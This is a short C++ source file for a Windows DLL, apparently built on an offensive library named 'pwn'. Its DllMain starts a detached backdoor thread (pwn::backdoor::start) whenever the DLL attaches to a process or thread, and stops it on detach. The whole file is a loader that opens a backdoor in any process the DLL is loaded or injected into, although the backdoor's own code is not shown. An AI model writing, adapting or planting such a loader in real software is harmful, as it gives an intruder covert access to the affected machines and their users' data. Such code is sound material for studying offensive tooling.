
#include "pwn.hpp"


using namespace pwn::log;
using namespace pwn::utils::random;

using namespace pwn::win::thread;
using namespace pwn::backdoor;


void
OnAttachRoutine()
{
    //
    // Initialize the RNG
    //
    pwn::utils::random::seed();

    //
    // Start the backdoor thread
    //
    {
        pwn::globals.m_backdoor_thread = std::jthread::jthread(pwn::backdoor::start);
        pwn::globals.m_backdoor_thread.detach();
    }
}


void
OnDetachRoutine()
{
    {
        std::lock_guard<std::mutex> lock(pwn::globals.m_console_mutex);
        //
        // Prevents another thread to lock the mutex while we're exiting
        //
        pwn::backdoor::stop();
    }
}


BOOL APIENTRY
DllMain(_In_ HMODULE hModule, _In_ DWORD ul_reason_for_call, _In_ LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);

    switch ( ul_reason_for_call )
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
        OnAttachRoutine();
        break;

    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        OnDetachRoutine();
        break;
    }
    return TRUE;
}
